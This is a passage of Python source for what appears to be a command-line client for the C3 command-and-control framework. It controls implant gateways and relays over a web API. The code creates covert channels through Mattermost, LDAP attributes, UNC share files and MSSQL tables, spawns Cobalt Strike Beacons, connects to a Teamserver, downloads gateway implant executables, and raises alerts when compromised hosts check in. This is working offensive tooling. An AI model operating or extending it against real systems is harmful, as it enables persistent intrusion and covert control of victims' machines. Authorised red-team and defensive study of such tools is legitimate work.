        chan['url'] = f'/api/gateway/{gateway["agentId"]}/relay/{relay["agentId"]}/channel/{chan["iid"]}/command'
        closeChannel(chan, chanName)

    if not grcChannel:
        Logger.fatal(f'Could not determine Gateway-Return Channel of the specified Relay {relay["name"]} / {relay["agentId"]}. \n    Probably its unreachable or already closed.')

    closeChannel(grcChannel, getDeviceName(gateway, 'channels', grcChannel['type']))

    print('\n[.] step 3: closing Relay itself')
    data = {
        "name" : "RelayCommandGroup",
        "data" : {
            "id" : commandsMap['Close'],
            "name" : "Command",
            "command" : "Close",
            "arguments" : []
        }
    }

    Logger.dbg(f'Closing Relay {relay["agentId"]} (id: {relay["agentId"]}). with following parameters:\n\n' + json.dumps(data, indent = 4))

    ret = postRequest(f'/api/gateway/{gateway["agentId"]}/relay/{relay["agentId"]}/command', data, rawResp = True)
    if ret.status_code == 201:
        print(f'[+] Peripheral {relay["name"]} id:{relay["agentId"]} was closed.')
    else:
        print(f'[-] Peripheral {relay["name"]} id:{relay["agentId"]} was not closed: ({ret.status_code}) {ret.text}')

    print('\n[.] step 4: closing a channel being a neighbour for Relay\'s GRC')
    closed = False
    for relayNode in gateway['relays'] + [gateway,]:
        for route in relayNode['routes']:
            if route['receivingInterface'] == grcChannel['iid']:
                for chan in relayNode['channels']:
                    if chan['iid'] == route['outgoingInterface']:
                        if relayNode["agentId"] == gateway['agentId']:
                            chan['url'] = f'/api/gateway/{gateway["agentId"]}/channel/{chan["iid"]}/command'
                        else:
                            chan['url'] = f'/api/gateway/{gateway["agentId"]}/relay/{relayNode["agentId"]}/channel/{chan["iid"]}/command'
                            
                        closeChannel(chan, getDeviceName(gateway, 'channels', chan['type']))
                        closed = True
                        break
                if closed: break
            if closed: break
        if closed: break

    if closed: 
        print('[+] Non-Negotiation channel linked to Relay\'s Gateway-Return Channel was closed.')

def onCloseRelay(args):
    relays = collectRelays(args)
    if len(relays) == 0:
        Logger.fatal('Could not find agent (Gateway or Relay) which should be used to setup a channel.')

    for gateway, relay in relays:
        print(f'[.] Closing relay {relay["name"]} (in gateway: {gateway["name"]}).')
        closeRelay(gateway, relay)

def closePeripheral(gateway, relay, peripheralName, peripheralId):
    data = {
        "name" : "PeripheralCommandGroup",
        "data" : {
            "id" : commandsMap['Close'],
            "name" : peripheralName,
            "command" : "Close",
            "arguments" : []
        }
    }

    Logger.dbg(f'Closing peripheral {peripheralName} (id: {peripheralId}). with following parameters:\n\n' + json.dumps(data, indent = 4))

    ret = postRequest(f'/api/gateway/{gateway["agentId"]}/relay/{relay["agentId"]}/peripheral/{peripheralId}/command', data, rawResp = True)
    if ret.status_code == 201:
        print(f'[+] Peripheral {peripheralName} id:{peripheralId} was closed.')
    else:
        print(f'[-] Peripheral {peripheralName} id:{peripheralId} was not closed: ({ret.status_code}) {ret.text}')

def closeChannel(channel, channelToClose):
    chanId = ''
    if 'channelId' in channel.keys(): chanId = channel['channelId']
    elif 'channel_id' in channel.keys(): chanId = channel['channel_id']
    elif 'iid' in channel.keys(): chanId = channel['iid']

    data = {
        "name" : "ChannelCommandGroup",
        "data" : {
            "id" : commandsMap['Close'],
            "name" : channelToClose,
            "command" : "Close",
            "arguments" : []
        }
    }

    Logger.dbg(f'Closing {channelToClose} channel (id: {chanId}). with following parameters:\n\n' + json.dumps(data, indent = 4))

    ret = postRequest(channel["url"], data, rawResp = True)
    if ret.status_code == 201:
        print(f'[+] Channel {channelToClose} (id: {chanId}) was closed.')
    else:
        print(f'[-] Channel {channelToClose} (id: {chanId}) was not closed: ({ret.status_code}) {ret.text}')

def closeNetwork(gateway):
    data = {
        "name":"GatewayCommandGroup",
        "data":{ 
            "id":commandsMap['ClearNetwork'],
            "name":"Command",
            "command":"ClearNetwork",
            "arguments": [
                {
                    "type":"boolean",
                    "name":"Are you sure?",
                    "value": True
                }
            ]
        }
    }

    Logger.dbg(f'Closing gateway {gateway["name"]} with following parameters:\n\n' + json.dumps(data, indent = 4))

    ret = postRequest(f'/api/gateway/{gateway["agentId"]}/command', data, rawResp = True)
    if ret.status_code == 201:
        print(f'[+] Network on gateway {gateway["name"]} (id: {gateway["agentId"]}) was cleared.')
    else:
        print(f'[-] Network on gateway {gateway["name"]} (id: {gateway["agentId"]}) was not cleared: ({ret.status_code}) {ret.text}')

def onCloseNetwork(args):
    gateways = getRequest(f'/api/gateway')

    for _gateway in gateways:
        gateway = getRequest(f'/api/gateway/{_gateway["agentId"]}')
        if gateway['name'].lower() == args.gateway_id.lower() or gateway['agentId'] == args.gateway_id.lower():
            closeNetwork(gateway)

def onCloseChannel(args):
    gateways = getRequest('/api/gateway')
    channelsToClose = []

    for _gateway in gateways:
        if len(args.gateway_id) > 0:
            if _gateway["agentId"].lower() != args.gateway_id.lower() and _gateway["name"].lower() != args.gateway_id.lower():
                continue

        gateway = getRequest(f'/api/gateway/{_gateway["agentId"]}')
        capability = processCapability(gateway)

        if len(args.gateway_id) > 0:
            if gateway["agentId"].lower() == args.agent_id.lower() or gateway["name"].lower() == args.agent_id.lower():
                for channel in gateway['channels']:
                    name = getDeviceName(gateway, 'channels', channel['type'])
                    if len(args.channel_id) == 0 or (name.lower() == args.channel_id.lower() or channel['iid'] == args.channel_id):
                        _type = 'non-negotiation'
                        if 'isReturnChannel' in channel.keys() and channel['isReturnChannel']: _type = 'grc'
                        elif 'isNegotiationChannel' in channel.keys() and channel['isNegotiationChannel']: _type = 'negotiation'

                        channelsToClose.append({
                            'url' : f'/api/gateway/{_gateway["agentId"]}/relay/{relay["agentId"]}/channel/{channel["iid"]}/command',
                            'name' : name,
                            'iid' : channel['iid'],
                            'agent' : relay,
                            'type' : _type,
                            'kind' : 'Relay',
                        })

        for relay in gateway['relays']:
            if relay["agentId"].lower() != args.agent_id.lower() and relay["name"].lower() != args.agent_id.lower():
                continue

            for channel in relay['channels']:
                name = getDeviceName(gateway, 'channels', channel['type'])
                if len(args.channel_id) == 0 or (name.lower() == args.channel_id.lower() or channel['iid'] == args.channel_id):
                    
                    _type = 'non-negotiation'
                    if 'isReturnChannel' in channel.keys() and channel['isReturnChannel']: _type = 'grc'
                    elif 'isNegotiationChannel' in channel.keys() and channel['isNegotiationChannel']: _type = 'negotiation'

                    channelsToClose.append({
                        'url' : f'/api/gateway/{_gateway["agentId"]}/relay/{relay["agentId"]}/channel/{channel["iid"]}/command',
                        'name' : name,
                        'iid' : channel['iid'],
                        'agent' : relay,
                        'type' : _type,
                        'kind' : 'Relay',
                    })

    if len(channelsToClose) == 0:
        Logger.fatal('Could not find channels that should have been closed. Try changing search criteria.')

    for channel in channelsToClose:
        if channel['type'] == 'grc' and not args.close_grc: continue
        closeChannel(channel, channel['name'])

def onMattermostCreate(args):
    server_url = args.server_url
    if server_url.endswith('/'): server_url = server_url[:-1]

    gateway, relay = findAgent(args.agent_id)
    if not relay and not gateway:
        logger.fatal('Could not find agent (Gateway or Relay) which should be used to setup a channel.')

    url = f'/api/gateway/{gateway["agentId"]}/command'

    if relay != None:
        url = f'/api/gateway/{gateway["agentId"]}/relay/{relay["agentId"]}/command'
        print(f'[.] Will setup a Mattermost channel on a Relay named {relay["name"]} ({relay["agentId"]})')
    else:
        print(f'[.] Will setup a Mattermost channel on a Gateway named {gateway["name"]} ({gateway["agentId"]})')


    secondCommandId = getCommandIdMapping(gateway, 'AddNegotiationChannelMattermost')
    commandId = getLastGatewayCommandID()
    Logger.info(f'Issuing a command with ID = {commandId}')

    data = {
        "name" : "GatewayCommandGroup",
        "data" : {
            "arguments" : [
                {
                    "type" : "string",
                    "name" : "Negotiation Identifier",
                    "value" : getValueOrRandom(args.negotiation_id),
                },
                {
                    "type" : "string",
                    "name" : "Mattermost Server URL",
                    "value" : server_url,
                },
                {
                    "type" : "string",
                    "name" : "Mattermost Team Name",
                    "value" : args.team_name
                },
                {
                    "type" : "string",
                    "name" : "Mattermost Access Token",
                    "value" : args.access_token,
                },
                {
                    "type" : "string",
                    "name" : "Channel name",
                    "value" : getValueOrRandom(args.channel_name),
                },
                {
                    "type" : "string",
                    "name" : "User-Agent Header",
                    "value" : args.user_agent,
                }
            ],
            "command" : "AddNegotiationChannelMattermost",
            "id" : secondCommandId,
            "name" : "Command",
        },
        'name' : 'GatewayCommandGroup'
    }

    Logger.dbg('Will create Mattermost channel with following parameters:\n\n' + json.dumps(data, indent = 4))
    
    ret = postRequest(url, data, rawResp = True)

    if ret.status_code == 201:
        print('[+] Channel was created.')
    else:
        print(f'[-] Channel was not created: ({ret.status_code}) {ret.text}')

def onLDAPCreate(args):
    gateway, relay = findAgent(args.agent_id)
    if not relay and not gateway:
        logger.fatal('Could not find agent (Gateway or Relay) which should be used to setup a channel.')

    url = f'/api/gateway/{gateway["agentId"]}/command'

    if relay != None:
        url = f'/api/gateway/{gateway["agentId"]}/relay/{relay["agentId"]}/command'
        print(f'[.] Will setup a LDAP channel on a Relay named {relay["name"]} ({relay["agentId"]})')
    else:
        print(f'[.] Will setup a LDAP channel on a Gateway named {gateway["name"]} ({gateway["agentId"]})')

    secondCommandId = getCommandIdMapping(gateway, 'AddNegotiationChannelLDAP')
    commandId = getLastGatewayCommandID()
    Logger.info(f'Issuing a command with ID = {commandId}')

    data = {
        "data" : {
            "arguments" : [
                {
                    "type" : "string",
                    "name" : "Negotiation Identifier",
                    "value" : getValueOrRandom(args.negotiation_id),
                },
                {
                    "type" : "string",
                    "name" : "Data LDAP Attribute",
                    "value" : args.data_attribute,
                },
                {
                    "type" : "string",
                    "name" : "Lock LDAP Attribute",
                    "value" : args.lock_attribute
                },
                {
                    "type" : "uint32",
                    "name" : "Max Packet Size",
                    "value" : args.max_size,
                },
                {
                    "type" : "string",
                    "name" : "Domain Controller",
                    "value" : args.domain_controller,
                },
                {
                    "type" : "string",
                    "name" : "Username",
                    "value" : args.username,
                },
                {
                    "type" : "string",
                    "name" : "Password",
                    "value" : args.password,
                },
                {
                    "type" : "string",
                    "name" : "User DN",
                    "value" : args.user_dn,
                }
            ],
            "command" : "AddNegotiationChannelLDAP",
            "id" : secondCommandId,
            "name" : "Command",
        },
        'name' : 'GatewayCommandGroup'
    }

    Logger.dbg('Will create LDAP channel with following parameters:\n\n' + json.dumps(data, indent = 4))
    
    ret = postRequest(url, data, rawResp = True)

    if ret.status_code == 201:
        print('[+] Channel was created.')
    else:
        print(f'[-] Channel was not created: ({ret.status_code}) {ret.text}')

def onUncShareFileCreate(args):
    gateway, relay = findAgent(args.agent_id)
    if not relay and not gateway:
        logger.fatal('Could not find agent (Gateway or Relay) which should be used to setup a channel.')

    url = f'/api/gateway/{gateway["agentId"]}/command'

    if relay != None:
        url = f'/api/gateway/{gateway["agentId"]}/relay/{relay["agentId"]}/command'
        print(f'[.] Will setup a UncShareFile channel on a Relay named {relay["name"]} ({relay["agentId"]})')
    else:
        print(f'[.] Will setup a UncShareFile channel on a Gateway named {gateway["name"]} ({gateway["agentId"]})')

    secondCommandId = getCommandIdMapping(gateway, 'AddNegotiationChannelUncShareFile')
    commandId = getLastGatewayCommandID()
    Logger.info(f'Issuing a command with ID = {commandId}')

    data = {
        "data" : {
            "arguments" : [
                {
                    "type" : "string",
                    "name" : "Negotiation Identifier",
                    "value" : getValueOrRandom(args.negotiation_id),
                },
                {
                    "type" : "string",
                    "name" : "Filesystem path",
                    "value" : args.filesystem_path,
                },
                {
                    "type" : "boolean",
                    "name" : "Clear",
                    "value" : args.clear,
                }
            ],
            "command" : "AddNegotiationChannelUncShareFile",
            "id" : secondCommandId,
            "name" : "Command",
        },
        'name' : 'GatewayCommandGroup'
    }

    Logger.dbg('Will create UncShareFile channel with following parameters:\n\n' + json.dumps(data, indent = 4))
    
    ret = postRequest(url, data, rawResp = True)

    if ret.status_code == 201:
        print('[+] Channel was created.')
    else:
        print(f'[-] Channel was not created: ({ret.status_code}) {ret.text}')

def onMSSQLCreate(args):
    gateway, relay = findAgent(args.agent_id)
    if not relay and not gateway:
        logger.fatal('Could not find agent (Gateway or Relay) which should be used to setup a channel.')

    url = f'/api/gateway/{gateway["agentId"]}/command'

    if relay != None:
        url = f'/api/gateway/{gateway["agentId"]}/relay/{relay["agentId"]}/command'
        print(f'[.] Will setup a MSSQL channel on a Relay named {relay["name"]} ({relay["agentId"]})')
    else:
        print(f'[.] Will setup a MSSQL channel on a Gateway named {gateway["name"]} ({gateway["agentId"]})')

    secondCommandId = getCommandIdMapping(gateway, 'AddNegotiationChannelMSSQL')
    commandId = getLastGatewayCommandID()
    Logger.info(f'Issuing a command with ID = {commandId}')

    data = {
        "data" : {
            "arguments" : [
                {
                    "type" : "string",
                    "name" : "Negotiation Identifier",
                    "value" : getValueOrRandom(args.negotiation_id),
                },
                {
                    "type" : "string",
                    "name" : "Server Name",
                    "value" : args.server_name,
                },
                {
                    "type" : "string",
                    "name" : "Database Name",
                    "value" : args.database_name
                },
                {
                    "type" : "string",
                    "name" : "Table Name",
                    "value" : args.table_name,
                },
                {
                    "type" : "string",
                    "name" : "Username",
                    "value" : args.username,
                },
                {
                    "type" : "string",
                    "name" : "Password",
                    "value" : args.password,
                },
                {
                    "type" : "boolean",
                    "name" : "Use Integrated Security (SSPI) - use for domain joined accounts",
                    "value" : args.sspi,
                }
            ],
            "command" : "AddNegotiationChannelMSSQL",
            "id" : secondCommandId,
            "name" : "Command",
        },
        'name' : 'GatewayCommandGroup'
    }

    Logger.dbg('Will create MSSQL channel with following parameters:\n\n' + json.dumps(data, indent = 4))
    
    ret = postRequest(url, data, rawResp = True)

    if ret.status_code == 201:
        print('[+] Channel was created.')
    else:
        print(f'[-] Channel was not created: ({ret.status_code}) {ret.text}')

def onSpawnBeacon(args):
    relays = collectRelays(args)
    if len(relays) == 0:
        logger.fatal('Could not find Relay to be used to spawn a Beacon.')

    for gateway, relay in relays:
        secondCommandId = getCommandIdMapping(gateway, 'AddPeripheralBeacon')
        commandId = getLastGatewayCommandID()
        Logger.info(f'Issuing a command with ID = {commandId}')

        data = {
            "name" : "RelayCommandGroup",
            "data" : {
                "arguments" : [
                    {
                        "type" : "string",
                        "name" : "Pipe Name",
                        "value" : getValueOrRandom(args.pipe_name),
                    },
                    {
                        "type" : "int16",
                        "name" : "Connection trials",
                        "value" : args.trials,
                    },
                    {
                        "type" : "int16",
                        "name" : "Trials delay",
                        "value" : args.delay
                    }
                ],
                "command" : "AddPeripheralBeacon",
                "id" : secondCommandId,
                "name" : "Command",
            },
        }

        Logger.dbg('Will spawn Beacon with following parameters:\n\n' + json.dumps(data, indent = 4))
    
        print(f'[+] Spawning Beacon on relay: {relay["name"]} (id: {relay["agentId"]}) on gateway {gateway["name"]}')
        ret = postRequest(f'/api/gateway/{gateway["agentId"]}/relay/{relay["agentId"]}/command', data, rawResp = True)

        if ret.status_code == 201:
            print('[+] Beacon was spawned.')
        else:
            print(f'[-] Beacon could not be spawned: ({ret.status_code}) {ret.text}')

def onTurnOnTeamserver(args):
    gateways = getRequest(f'/api/gateway')
    gateway = None

    for _gateway in gateways:
        g = getRequest(f'/api/gateway/{_gateway["agentId"]}')
        if g['name'].lower() == args.gateway_id.lower() or g['agentId'] == args.gateway_id.lower():
            gateway = g
            break

    if not gateway:
        Logger.fatal(f'Could not find Gateway with specified gateway_id: {args.gateway_id}')

    commandId = getCommandIdMapping(gateway, "TurnOnConnectorTeamServer")
    data = {
        "name":"GatewayCommandGroup",
        "data": {
            "id":commandId,
            "name":"Command",
            "command":"TurnOnConnectorTeamServer",
            "arguments": [ 
                { 
                    "type":"ip",
                    "name":"Address",
                    "value":args.address
                },
                {
                    "type":"uint16",
                    "name":"Port",
                    "value":args.port
                }
            ]
        }
    }

    Logger.dbg(f'Will Turn On connector TeamServer on gateway {gateway["name"]} with following parameters:\n\n' + json.dumps(data, indent = 4))
    
    ret = postRequest(f'/api/gateway/{gateway["agentId"]}/command', data, rawResp = True)

    if ret.status_code == 201:
        print('[+] Connection with Teamserver established.')
    else:
        print(f'[-] Could not establish connection with Teamserver: ({ret.status_code}) {ret.text}')

def onTurnOffConnector(args):
    gateways = getRequest(f'/api/gateway')
    gateway = None

    for _gateway in gateways:
        g = getRequest(f'/api/gateway/{_gateway["agentId"]}')
        if g['name'].lower() == args.gateway_id.lower() or g['agentId'] == args.gateway_id.lower():
            gateway = g
            break

    if not gateway:
        Logger.fatal(f'Could not find Gateway with specified gateway_id: {args.gateway_id}')

    data = {
        "name":"PeripheralCommandGroup",
        "data": { 
            "id":commandsMap['Close'],
            "name":"TeamServer",
            "command":"TurnOff",
            "arguments": []
        }
    }

    Logger.dbg(f'Will Turn Off connector TeamServer on gateway {gateway["name"]} with following parameters:\n\n' + json.dumps(data, indent = 4))
    
    ret = postRequest(f'/api/gateway/{gateway["agentId"]}/connector/{args.connector_id}/command', data, rawResp = True)

    if ret.status_code == 201:
        print('[+] Closed connection with Connector.')
    else:
        print(f'[-] Could not close connection with connector: ({ret.status_code}) {ret.text}')


def onDownloadGateway(args):
    gateway_name = getValueOrRandom(args.gateway_name)
    _format = 'exe'
    arch = 'x64'

    if args.format.lower().startswith('dll'): _format = 'dll'
    if args.format.lower().endswith('86'): _format = 'x86'

    print(f'[.] Downloading gateway executable in format {args.format} with name: {gateway_name}')
    url = f'/api/gateway/{_format}/{arch}?name={gateway_name}'

    output = getRequest(url, True, stream = True)
    data = output.content

    if len(args.override_ip) > 0:
        data2 = io.BytesIO()
        with zipfile.ZipFile(io.BytesIO(data), 'r') as f:
            with zipfile.ZipFile(data2, 'w') as g:
                for i in f.infolist():
                    buf = f.read(i.filename)
                    if i.filename.lower().endswith('.json'):
                        conf = json.loads(buf)
                        conf['API Bridge IP'] = args.override_ip
                        buf = json.dumps(conf, indent=4)
                        print(f'[.] Overidden stored in JSON configuration IP address to: {args.override_ip}')
                    g.writestr(i.filename, buf)

            data = data2.getvalue()

    if args.extract:
        with zipfile.ZipFile(io.BytesIO(data), 'r') as f:
            for i in f.infolist():
                outp = os.path.join(args.outfile, os.path.basename(i.filename))
                with open(outp, 'wb') as g:
                    g.write(f.read(i.filename))

        print('[+] Gateway ZIP package downloaded & extracted.')
    else:
        with open(args.outfile, 'wb') as f:
            f.write(data)

        print('[+] Gateway ZIP package downloaded.')

def parseArgs(argv):
    global config

    usage = '\nUsage: ./c3-client.py [options] <host> <command> [...]\n'
    opts = argparse.ArgumentParser(
        prog = argv[0],
        usage = usage
    )

    opts.add_argument('host', help = 'C3 Web API host:port')

    opts.add_argument('-v', '--verbose', action='store_true', help='Display verbose output.')
    opts.add_argument('-d', '--debug', action='store_true', help='Display debug output.')
    opts.add_argument('-f', '--format', choices=['json', 'text'], default='text', help='Output format. Can be JSON or text (default).')
    opts.add_argument('-n', '--dry-run', action='store_true', help='Do not send any HTTP POST request that could introduce changes in C3 network.')
    opts.add_argument('-A', '--httpauth', metavar = 'user:pass', default='', help = 'HTTP Basic Authentication (user:pass)')

    subparsers = opts.add_subparsers(help = 'command help', required = True)

    #
    # Alarm
    #
    alarm = subparsers.add_parser('alarm', help = 'Alarm options')
    alarm_sub = alarm.add_subparsers(help = 'Alarm on what?', required = True)

    alarm_relay = alarm_sub.add_parser('relay', help = 'Trigger an alarm whenever a new Relay checks-in.')
    alarm_relay.add_argument('-e', '--execute', action='append', default=[], help = 'If new Relay checks in - execute this command. Use following placeholders in your command: <computerName>, <userName>, <domain>, <isElevated>, <osVersion>, <processId>, <relayName>, <relayId>, <buildId>, <gatewayId>, <gatewayName>, <timestamp> to customize executed command\'s parameters. Example: powershell -c "Add-Type -AssemblyName System.Speech; $synth = New-Object -TypeName System.Speech.Synthesis.SpeechSynthesizer; $synth.Speak(\'New Relay just checked-in <domain>/<userName>@<computerName>\')"')
    alarm_relay.add_argument('-x', '--webhook', action='append', default=[], help = 'Trigger a Webhook (HTTP POST request) to this URL whenever a new Relay checks-in. The request will contain JSON message with all the fields available, mentioned in --execute option.')
    alarm_relay.add_argument('-g', '--gateway-id', metavar='gateway_id', default='', help = 'ID (or Name) of the Gateway which Relays should be returned. If not given, will result all relays from all gateways.')
    alarm_relay.add_argument('-D', '--delay', metavar = 'delay', type=int, default=10, help = 'New relays polling delay-time. Will poll new relays every N seconds. Setting this too low may impact Gateway\'s performance. Default: 10 seconds.')
    alarm_relay.add_argument('-E', '--command-delay', metavar = 'command_delay', type=int, default=5, help = 'Delay before running a command/triggering a webhook (and between consecutive commands/webhooks). Default: 5 seconds')
    alarm_relay.set_defaults(func = onAlarmRelay)

    #
    # Download
    #
    download = subparsers.add_parser('download', help = 'Download options')
    download_sub = download.add_subparsers(help = 'Download what?', required = True)

    download_gateway = download_sub.add_parser('gateway', help = 'Download gateway')
    download_gateway.add_argument('-x', '--extract', action='store_true', help = 'Consider outfile as directory path. Then extract downloaded ZIP file with gateway into that directory.')
    download_gateway.add_argument('-F', '--format', choices=['exe86', 'exe64', 'dll86', 'dll64'], default='exe64', help = 'Gateway executable format. <format><arch>. Formats: exe, dll. Archs: 86, 64. Default: exe64')
    download_gateway.add_argument('-G', '--gateway-name', metavar='GATEWAY_NAME', default='random', help = 'Name of the Gateway. Default: random name')
    download_gateway.add_argument('-O', '--override-ip', metavar='IP', default='', help = 'Override gateway configuration IP stored in JSON. By default will use 0.0.0.0')
    download_gateway.add_argument('outfile', metavar='outfile', help = 'Where to save output file.')
    download_gateway.set_defaults(func = onDownloadGateway)

    #
    # List
    # 
    parser_list = subparsers.add_parser('list', help = 'List options')
    parser_list_sub = parser_list.add_subparsers(help = 'List what?', required = True)

    list_gateways = parser_list_sub.add_parser('gateways', help = 'List available gateways.')
    list_gateways.add_argument('-a', '--active', action='store_true', help = 'List only active gateways')
    list_gateways.set_defaults(func = onListGateways)

    list_relays = parser_list_sub.add_parser('relays', help = 'List available relays.')
    list_relays.set_defaults(func = onListRelays)
    list_relays.add_argument('-a', '--active', action='store_true', help = 'List only active relays')
    list_relays.add_argument('-g', '--gateway-id', metavar='gateway_id', default='', help = 'ID (or Name) of the Gateway which Relays should be returned. If not given, will result all relays from all gateways.')

    #
    # Get
    #
    parser_get = subparsers.add_parser('get', help = 'Get options')
    parser_get_sub = parser_get.add_subparsers(help = 'Get what?', required = True)

    get_gateway = parser_get_sub.add_parser('gateway', help = 'Get gateway\'s data.')
    get_gateway.set_defaults(func = onGetGateway)
    get_gateway.add_argument('name', help = 'Gateway Name or ID')

    get_relay = parser_get_sub.add_parser('relay', help = 'Get relay\'s data.')
    get_relay.set_defaults(func = onGetRelay)
    get_relay.add_argument('name', help = 'Relay Name or ID')
    get_relay.add_argument('-g', '--gateway-id', metavar='gateway_id', default='', help = 'ID (or Name) of the Gateway runs specified Relay. If not given, will return all relays matching criteria from all gateways.')

    #
    # Ping
    #
    parser_ping = subparsers.add_parser('ping', help = 'Ping Relays')
    parser_ping.add_argument('-r', '--relay-id', default='', help = 'Specifies which Relay should be pinged. Can be its ID or name.')
    parser_ping.add_argument('-g', '--gateway-id', default='', metavar='gateway_id', help = 'ID (or Name) of the Gateway which Relays should be pinged. If not given, will ping all relays in all gateways.')
    parser_ping.add_argument('-k', '--keep-pinging', metavar='delay', type=int, default=0, help = 'Keep pinging choosen Relays. Will send a ping every "delay" number of seconds. Default: sends ping only once.')
    parser_ping.set_defaults(func = onPing)

    #
    # Jitter
    #
    parser_jitter = subparsers.add_parser('jitter', help = 'Set Update Jitter on a channel')
    parser_jitter.add_argument('min_jitter', type=float, help = 'Min Jitter in seconds to set (float value)')
    parser_jitter.add_argument('max_jitter', type=float, help = 'Max Jitter in seconds to set (float value)')
    parser_jitter.add_argument('-c', '--channel-id', default='', help = 'Specifies ID (or Name) of the channel to commander. If not given - will issue specified command to all channels in a Relay. If name is given, will update Jitter on all Channels with that name.')
    parser_jitter.add_argument('-r', '--relay-id', default='', help = 'Specifies which Relay should be pinged. Can be its ID or name.')
    parser_jitter.add_argument('-g', '--gateway-id', default='', metavar='gateway_id', help = 'ID (or Name) of the Gateway which Relays should be pinged. If not given, will ping all relays in all gateways.')
    parser_jitter.set_defaults(func = onJitter)

    #
    # Spawn
    # 
    parser_spawn = subparsers.add_parser('spawn', help = 'Spawn implant options')
    parser_spawn_sub = parser_spawn.add_subparsers(help = 'What to spawn?', required = True)

    ### Beacon
    beacon = parser_spawn_sub.add_parser('beacon', help = 'Spawn new Cobalt Strike Beacon.')
    beacon.add_argument('relay_id', metavar = 'relay_id', help = 'Relay in which to spawn Beacon. Can be ID or Name.')
    beacon.add_argument('--pipe-name', metavar = 'pipe_name', default='random', help = 'Beacon Pipe name. Default: random')
    beacon.add_argument('--trials', metavar = 'trials', type=int, default=10, help = 'Beacon connection trials. Default: 10')
    beacon.add_argument('--delay', metavar = 'delay', type=int, default=1000, help = 'Beacon connection delay. Default: 1000')
    beacon.add_argument('-g', '--gateway-id', metavar='gateway_id', default='', help = 'ID (or Name) of the Gateway runs specified Relay. If not given, will return all relays matching criteria from all gateways.')
    beacon.set_defaults(func = onSpawnBeacon)

    #
    # Connector
    # 
    parser_connector = subparsers.add_parser('connector', help = 'Connector options')
    parser_connector.add_argument('gateway_id', metavar = 'gateway_id', help = 'Gateway which should be used to manage its connectors.')
    parser_connector_sub = parser_connector.add_subparsers(help = 'What to do about that Connector?', required = True)

    ## turnon
    connector_turnon = parser_connector_sub.add_parser('turnon', help = 'Turn on connector (connects to a Teamserver, Covenant, etc).')
    connector_turnon_sub = connector_turnon.add_subparsers(help = 'What kind of connector?', required = True)

    ### Teamserver
    turnon_connector_teamserver = connector_turnon_sub.add_parser('teamserver', help = 'Teamserver connector specific options.')
    turnon_connector_teamserver.add_argument('address', metavar = 'address', help = 'Teamserver externalC2 address')
    turnon_connector_teamserver.add_argument('port', metavar = 'port', help = 'Teamserver externalC2 port')
    turnon_connector_teamserver.set_defaults(func = onTurnOnTeamserver)

    ## turnoff
    connector_turnoff = parser_connector_sub.add_parser('turnoff', help = 'Turn off connector (connects to a Teamserver, Covenant, etc).')
    connector_turnoff.add_argument('connector_id', metavar = 'connector_id', help = 'Connector\'s ID that should be closed')
    connector_turnoff.set_defaults(func = onTurnOffConnector)
    
    #
    # Close
    #
    parser_close = subparsers.add_parser('close', help = 'Close command.')
    parser_close_sub = parser_close.add_subparsers(help = 'Close what?', required = True)

    ## Network
    close_channel = parser_close_sub.add_parser('network', help = 'Close Network / ClearNetwork.')
    close_channel.add_argument('gateway_id', metavar = 'gateway_id', help = 'Gateway which network is to be closed. Can be ID or Name.')
    close_channel.set_defaults(func = onCloseNetwork)

    ## Channel
    close_channel = parser_close_sub.add_parser('channel', help = 'Close a channel.')
    close_channel.add_argument('agent_id', metavar = 'agent_id', help = 'Gateway or Relay that will be used to find a channel to close. Can be ID or Name.')
    close_channel.add_argument('-G', '--close-grc', action='store_true', help = 'Close Gateway-Return Channel (Non-negotiation one) as well. By default the GRC channel (the one marked with violet icon) will not be closed to avoid losing connectivity with relay.')
    close_channel.add_argument('-c', '--channel-id', default='', help = 'Specifies ID (or Name) of the channel to commander. If not given - will issue specified command to all channels in a Relay. If name is given, will update Jitter on all Channels with that name.')
    close_channel.add_argument('-g', '--gateway-id', default='', metavar='gateway_id', help = 'ID (or Name) of the Gateway which Relays should be pinged. If not given, will ping all relays in all gateways.')
    close_channel.set_defaults(func = onCloseChannel)

    ## Relay
    close_channel = parser_close_sub.add_parser('relay', help = 'Close a Relay.')
    close_channel.add_argument('relay_id', metavar = 'relay_id', help = 'Relay to be closed. Can be ID or Name.')
    close_channel.add_argument('-g', '--gateway-id', default='', metavar='gateway_id', help = 'ID (or Name) of the Gateway runs specified Relay. If not given, will return all relays matching criteria from all gateways.')
    close_channel.set_defaults(func = onCloseRelay)


    #
    # Channel
    #
    parser_channel = subparsers.add_parser('channel', help = 'Send Channel-specific command')
    parser_channel.add_argument('-c', '--channel-id', default='', help = 'Specifies ID of the channel to commander. If not given - will issue specified command to all channels in a Relay.')
    parser_channel.add_argument('-r', '--relay-id', default='', help = 'Specifies Relay that runs target channel. Can be its ID or name.')
    parser_channel.add_argument('-g', '--gateway-id', default='', metavar='gateway_id', help = 'ID (or Name) of the Gateway which Relays should be pinged. If not given, will ping all relays in all gateways.')
    
    parser_channel_sub = parser_channel.add_subparsers(help = 'Specify channel', required = True)

    ## All channels
    all_channels = parser_channel_sub.add_parser('all', help = 'Commands that are common for all channels.')
    all_channels_parser = all_channels.add_subparsers(help = 'Command to send', required = True)

    ### clear
    all_channels_clear = all_channels_parser.add_parser('clear', help = 'Clear every channel\'s message queue.')
    all_channels_clear.set_defaults(func = onAllChannelsClear)

    ## Mattermost
    mattermost = parser_channel_sub.add_parser('mattermost', help = 'Mattermost channel specific commands.')
    mattermost_parser = mattermost.add_subparsers(help = 'Command to send', required = True)

    ### Create
    mattermost_create = mattermost_parser.add_parser('create', help = 'Setup a Mattermost Negotiation channel.')
    mattermost_create.add_argument('agent_id', metavar = 'agent_id', help = 'Gateway or Relay that will be used to setup a channel. Can be ID or Name.')
    mattermost_create.add_argument('server_url', metavar = 'server_url', help = 'Mattermost Server URL, example: http://192.168.0.100:8888')
    mattermost_create.add_argument('team_name', metavar = 'team_name', help = 'Mattermost Team name where to create channels.')
    mattermost_create.add_argument('access_token', metavar = 'access_token', help = 'Personal Access Token value.')
    mattermost_create.add_argument('--negotiation-id', metavar = 'ID', default='random', help = 'Negotiation Identifier. Will be picked at random if left empty.')
    mattermost_create.add_argument('--channel-name', metavar = 'CHANNEL', default='random', help = 'Channel name to create. Will be picked at random if left empty.')
    mattermost_create.add_argument('--user-agent', metavar = 'USERAGENT', default='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36', 
                                    help = 'User-Agent string to use in HTTP requests.')
    mattermost_create.set_defaults(func = onMattermostCreate)

    ### Purge
